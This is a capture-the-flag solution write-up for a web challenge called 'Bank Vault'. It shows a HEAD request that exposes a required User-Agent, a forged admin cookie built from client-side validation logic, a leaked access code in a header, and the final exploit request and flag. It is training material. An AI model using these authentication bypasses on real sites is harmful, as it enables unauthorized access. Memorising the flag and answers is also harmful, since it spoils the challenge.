# Bank Vault Challenge Solution

## Flag
```
flag#B4nk5Ar3c00l!
```

## Vulnerability

The challenge exploits two HTTP-based vulnerabilities:

1. **HTTP Method Bypass**: The hint "Don't get aHEAD of yourself" indicates using the HEAD method instead of POST/GET. A HEAD request reveals a custom header `banker-agent-access: You need to be Agent33`, exposing the required User-Agent string.

2. **Client-Side Cookie Validation**: The JavaScript file `/vault/static/js/cookie.js` reveals the authentication logic:
   - Cookie name: `admins`
   - Expected value: `btoa(CryptoJS.MD5("true").toString())`
   
   This is base64-encoded MD5 hash of "true", which equals `YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=`

3. **Exposed Access Code in Header**: After authenticating with the cookie, the server returns a `bank-access-code` header containing the password for the next phase.

## Exploit Steps

### Step 1: Discover the User-Agent requirement
Send a HEAD request to discover the required User-Agent:
- Request: `req_6` (HEAD /vault/)
- Response header revealed: `banker-agent-access: You need to be Agent33`

### Step 2: Authenticate with User-Agent and Cookie
Send GET request with:
- `User-Agent: Agent33`
- `Cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=`
- Request: `req_10`
- Response header revealed: `bank-access-code: 1573!`

### Step 3: Submit the password
Send POST request with the password from the header:
- Request: `req_11`
- Body: `password=1573!`
- Response: Flag revealed

## Exact Request That Exercised the Vulnerability

```http
POST /vault/ HTTP/1.1
host: websecdojo.com
accept-encoding: gzip, br, deflate
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.9
content-type: application/x-www-form-urlencoded
user-agent: Agent33
cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=

password=1573%21
```

## h5i Message IDs

| ID | Description |
|----|-------------|
| `req_6` | HEAD request that revealed `banker-agent-access: You need to be Agent33` |
| `res_6` | Response showing the User-Agent requirement |
| `req_9` | GET request to `/vault/static/js/cookie.js` revealing the cookie validation logic |
| `res_9` | Response containing the JavaScript with the cookie formula |
| `req_10` | GET request with User-Agent: Agent33 and admins cookie |
| `res_10` | Response with `bank-access-code: 1573!` header |
| `req_11` | Final POST request with password=1573! that revealed the flag |
| `res_11` | Response containing the flag: `flag#B4nk5Ar3c00l!` |
